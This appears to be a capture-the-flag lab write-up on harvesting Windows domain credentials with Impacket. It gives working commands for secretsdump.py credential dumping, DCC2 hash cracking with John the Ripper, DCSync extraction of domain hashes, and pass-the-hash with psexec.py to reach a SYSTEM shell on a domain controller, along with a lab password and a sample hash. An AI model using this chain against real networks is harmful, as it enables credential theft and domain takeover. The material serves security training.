# 🕵️ Credential Harvesting with SecretsDump

> **Topic:** Credential Harvesting
>
> **Focus:** Remote credential extraction using Impacket's `secretsdump.py`, followed by offline cracking and authorised credential reuse.

---

# 📖 Overview

`secretsdump.py` is part of the Impacket toolkit.

The supplied material explains that it can extract credential material remotely through Windows services and DCE/RPC.

Depending on the privileges of the supplied account, it can retrieve:

- Local SAM hashes
- Cached domain credentials
- LSA secrets
- Domain credential material from a Domain Controller

---

# 🎯 Why SecretsDump Is Useful

The technique demonstrated in the lab does not require manually uploading a credential-dumping binary to the target.

Instead, it interacts with Windows functionality remotely.

The lab starts with local Administrator access to:

```text
WRK
```

and uses that access to obtain cached domain credentials.

---

# 1️⃣ Dumping Hashes with Local Administrator

Run from the AttackBox:

```bash
secretsdump.py WRK/Administrator:N3w34829DJdd?1@10.220.10.20 -output local_dump
```

---

# 🔎 What Happens

The supplied output shows:

```text
[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: ...
[*] Dumping local SAM hashes
[*] Dumping cached domain logon information
```

The tool retrieves both local SAM hashes and cached domain logon material.

---

# 🧂 Local SAM Hashes

Example output format:

```text
Administrator:500:LMHASH:NTHASH:::
```

The supplied lab includes local accounts such as:

```text
Administrator
Guest
DefaultAccount
WDAGUtilityAccount
LocalUser1
ElonTusk
```

---

# 🌐 Cached Domain Credentials

The supplied material shows MS-Cache v2 / DCC2 entries such as:

```text
TRYHACKME.LOC/Administrator:$DCC2$...
TRYHACKME.LOC/raoulduke:$DCC2$...
TRYHACKME.LOC/svc-app:$DCC2$...
TRYHACKME.LOC/drgonzo:$DCC2$...
```

---

# 🔐 What Is DCC2?

DCC2 stands for:

```text
Domain Cached Credentials 2
```

These are cached domain credentials stored locally so users can authenticate when the machine cannot contact the Domain Controller.

---

# ⚠️ DCC2 vs NTLM

DCC2 hashes cannot be used directly for pass-the-hash authentication.

They are intended for:

```text
Offline password cracking
```

---

# 2️⃣ Crack the DCC2 Hash

Create a file containing the target hash:

```bash
cat dc2_hash.txt
```

Example:

```text
$DCC2$10240#drgonzo#d0dc1647e45cf7364ecec3c7740fce0f
```

---

# 🔨 John the Ripper

The supplied material uses John:

```bash
john --format=mscash2 dc2_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

### Parameters

| Parameter | Meaning |
|---|---|
| `--format=mscash2` | Select DCC2 / MS Cache Hash 2 format |
| `dc2_hash.txt` | File containing the hash |
| `--wordlist` | Specify password wordlist |
| `rockyou.txt` | Password candidates |

---

# 🎯 Result in the Lab

The supplied lab reports that the password for `drgonzo` was successfully recovered.

The recovered credentials allowed RDP access to the Domain Controller.

However, the account did not yet provide access to the target flag on the Domain Admin's Desktop.

This demonstrates an important principle:

```text
Valid Domain Credential
        ≠
Domain Admin
```

---

# 3️⃣ Dump Domain Credentials with Domain Admin

After obtaining Domain Admin credentials, the supplied material reruns `secretsdump.py` against the Domain Controller.

Example:

```bash
secretsdump.py TRYHACKME/drgonzo:*******@10.220.10.10 -just-dc -output dc_dump
```

---

# 🏛️ `-just-dc`

The supplied material explains that:

```text
-just-dc
```

skips local SAM/LSA hive extraction and performs the domain credential extraction through the DRSUAPI / DCSync mechanism.

Conceptually:

```text
Domain Admin Privileges
        ↓
DRSUAPI / DCSync
        ↓
Domain Controller
        ↓
NTDS.dit Credential Material
        ↓
Domain User NTLM Hashes
        +
Kerberos Keys
```

---

# 📊 Domain Credential Output

The output format is:

```text
username:RID:LM hash:NT hash:::
```

The supplied lab demonstrates domain accounts including:

```text
Administrator
Guest
krbtgt
raoulduke
svc-app
drgonzo
HunterThompson
DC$
WRK$
```

and corresponding NTLM/Kerberos credential material.

---

# 4️⃣ Pass-the-Hash

Once a domain administrator's NTLM hash is available, the plaintext password is not necessarily required.

Windows supports **Pass-the-Hash (PtH)** authentication.

The supplied lab uses Impacket's `psexec.py`.

---

# 💻 PsExec with NTLM Hash

```bash
psexec.py 'TRYHACKME/Administrator@10.220.10.10' -hashes :****************
```

The supplied output shows:

```text
[*] Requesting shares
[*] Found writable share ADMIN$
[*] Uploading file
[*] Opening SVCManager
[*] Creating service
[*] Starting service
```

The resulting shell is:

```text
C:\Windows\system32>
```

---

# 👤 Verify Identity

```cmd
whoami
```

The supplied lab reaches:

```text
nt authority\system
```

---

# 🔄 Complete Credential-Harvesting Chain

```text
Local Administrator
        ↓
secretsdump.py
        ↓
Local SAM + DCC2
        ↓
Crack DCC2
        ↓
Domain User
        ↓
Obtain Higher Privileges
        ↓
Domain Admin
        ↓
secretsdump.py -just-dc
        ↓
Domain NTLM Hashes + Kerberos Keys
        ↓
Pass-the-Hash
        ↓
psexec.py
        ↓
SYSTEM on DC
```

---

# 🧠 Key Takeaways

- `secretsdump.py` can remotely extract several classes of Windows credential material.
- Local Administrator access can expose local SAM hashes and cached domain credentials.
- DCC2 hashes require offline cracking and cannot directly be used for pass-the-hash.
- Domain Admin privileges can enable DCSync-style extraction from a Domain Controller.
- `-just-dc` focuses on domain credential extraction.
- NTLM hashes can potentially be reused through Pass-the-Hash.
- `psexec.py` can be used in the supplied lab to obtain a SYSTEM shell.
